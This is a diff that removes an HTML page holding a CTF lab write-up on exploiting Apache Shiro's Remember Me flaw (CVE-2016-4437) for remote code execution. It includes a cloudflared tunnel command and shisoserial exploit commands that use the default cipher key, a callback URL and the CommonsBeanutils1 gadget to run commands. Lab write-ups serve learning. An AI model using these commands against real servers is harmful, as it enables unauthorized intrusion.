@@ -1,71 +1,0 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Shiro | H4rm0ny Hub</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="../../../../css/style.css" />
-</head>
-<body class="scanlines">
-  <div class="scroll-progress" aria-hidden="true"></div>
-  <div class="vignette" aria-hidden="true"></div>
-  <div class="scan-line" aria-hidden="true"></div>
-  <canvas id="hex-canvas" aria-hidden="true"></canvas>
-  <div class="cursor-glow" aria-hidden="true"></div>
-  
-  <main class="page writeup-page">
-    
-    <p class="back-link"><a href="../../../../index.html">â† cd ../hub</a></p>
-    <header class="hero writeup-hero visible" id="hero" data-section>
-      <div class="hero-inner">
-        <div class="hero-avatar-wrap"><img class="hero-avatar" src="avatar.png" alt="" loading="eager" /></div>
-        <h1 class="hero-name">Shiro</h1>
-        <p class="hero-title">Hard â€¢ Linux â€¢ Infinity Learning â€¢ 2026-05-26</p>
-        <p class="hero-summary">Exploiting Apache Shiro's Remember Me vulnerability (CVE-2016-4437) to achieve Remote Code Execution and retrieve the flag.</p>
-      </div>
-    </header>
-
-    <section class="section visible" id="content" data-section>
-      <div class="section-header">
-        <div class="section-hex" aria-hidden="true"></div>
-        <h2 class="section-title"><span>//</span> WRITEUP</h2>
-      </div>
-      <article class="panel md-content"><h1>Shiro</h1>
-<p>First, let's access our target page.</p>
-<p><img alt="image.png" src="image.png" /></p>
-<p>Which has default credentials -_-.</p>
-<p>After trying these credentials, we got the admin panel.</p>
-<p><img alt="image.png" src="image%201.png" /></p>
-<p>And there is a note in the footer.</p>
-<p><img alt="image.png" src="image%202.png" /></p>
-<p>So as you can see, it uses Apache Shiro for authentication. Let's search for any vulnerabilities for it.</p>
-<p>After a lot of searching, I found a CVE that is related to &quot;Remember Me&quot;: <a href="https://nvd.nist.gov/vuln/detail/cve-2016-4437">https://nvd.nist.gov/vuln/detail/cve-2016-4437</a>, and it's Remote Code Execution (RCE).</p>
-<p><a href="https://packetstorm.news/files/id/157497">https://packetstorm.news/files/id/157497</a> - so as you can see, it has a Metasploit module.</p>
-<p><img alt="image.png" src="image%203.png" /></p>
-<p>It didn't work after a lot of tries, so I tried a public exploit: <a href="https://github.com/4nth0ny1130/shisoserial">https://github.com/4nth0ny1130/shisoserial</a>.</p>
-<p>But first, we must use Cloudflared to start tunneling.</p>
-<pre><code>cloudflared tunnel --url tcp://localhost:4444</code></pre>
-<p>You will have a link, and that is the link we need.</p>
-<pre><code>❯ python3 shisoserial.py -m crack -u http://173.208.132.134:30707 -t CBC -p https://yourlink.com</code></pre>
-<p><img alt="image.png" src="image%204.png" /></p>
-<p>Here is the key we will use:</p>
-<pre><code>❯ python3 shisoserial.py -m echo -u http://173.208.132.134:30707 -t CBC -k kPH+bIxk5D2deZiIxcaaaA== -c &quot;id&quot; -g CommonsBeanutils1</code></pre>
-<p><img alt="image.png" src="image%205.png" /></p>
-<p>And here we got the RCE.</p>
-<p><img alt="image.png" src="image%206.png" /></p>
-<p>And here is our flag ;)</p>
-<p><img alt="image.png" src="image%207.png" /></p>
-</article>
-    </section>
-    <footer>
-      <span class="hex-dot" aria-hidden="true"></span>
-      H4rm0ny Content Hub &copy; 2026
-      <span class="hex-dot" aria-hidden="true"></span>
-    </footer>
-  </main>
-  <script type="module" src="../../../../js/main.js"></script>
-</body>
-</html>
